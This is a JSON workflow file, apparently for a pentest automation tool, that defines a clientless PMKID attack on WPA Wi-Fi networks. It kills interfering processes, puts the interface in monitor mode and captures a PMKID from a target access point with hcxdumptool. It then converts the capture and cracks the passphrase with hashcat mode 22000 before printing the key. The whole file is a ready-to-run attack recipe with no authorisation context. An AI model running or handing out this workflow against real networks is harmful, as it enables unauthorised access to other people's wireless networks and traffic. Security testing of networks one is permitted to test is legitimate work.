{
  "name": "pmkid_attack",
  "description": "PMKID clientless attack: capture PMKID from AP without any connected clients using hcxdumptool, convert with hcxpcapngtool, then crack with hashcat.",
  "author": "james-linux",
  "version": "2.0",
  "requires_root": true,
  "steps": [
    {
      "id": "check_kill",
      "action": "aircrack.check_kill",
      "description": "Kill interfering processes (NetworkManager, wpa_supplicant)"
    },
    {
      "id": "monitor_on",
      "action": "aircrack.enable_monitor",
      "params": {
        "interface": "{{interface}}"
      },
      "description": "Enable monitor mode"
    },
    {
      "id": "pmkid_capture",
      "action": "hcxtools.capture_pmkid",
      "params": {
        "interface": "{{monitor_interface}}",
        "output_pcapng": "/tmp/james_pmkid.pcapng",
        "timeout": 60
      },
      "description": "Capture PMKID from target AP (60 second window)"
    },
    {
      "id": "convert_hash",
      "action": "hcxtools.extract_hashes",
      "params": {
        "pcapng_file": "/tmp/james_pmkid.pcapng",
        "output_hash_file": "/tmp/james_pmkid_hash.22000"
      },
      "description": "Convert pcapng capture to hashcat 22000 format"
    },
    {
      "id": "crack_pmkid",
      "action": "hashcat.crack",
      "params": {
        "hash_file": "/tmp/james_pmkid_hash.22000",
        "wordlist": "{{wordlist}}",
        "hash_mode": 22000,
        "timeout": 1800
      },
      "description": "Crack PMKID hash with hashcat (mode 22000)"
    },
    {
      "id": "show_result",
      "action": "layer.run",
      "params": {
        "command": "echo '=== CRACKED ===' && cat /tmp/james_pmkid_cracked.txt 2>/dev/null || echo 'No key found in wordlist'",
        "timeout": 5
      },
      "description": "Display cracked result"
    },
    {
      "id": "monitor_off",
      "action": "aircrack.disable_monitor",
      "params": {
        "interface": "{{monitor_interface}}"
      },
      "description": "Restore managed mode"
    }
  ],
  "category": "wifi"
}
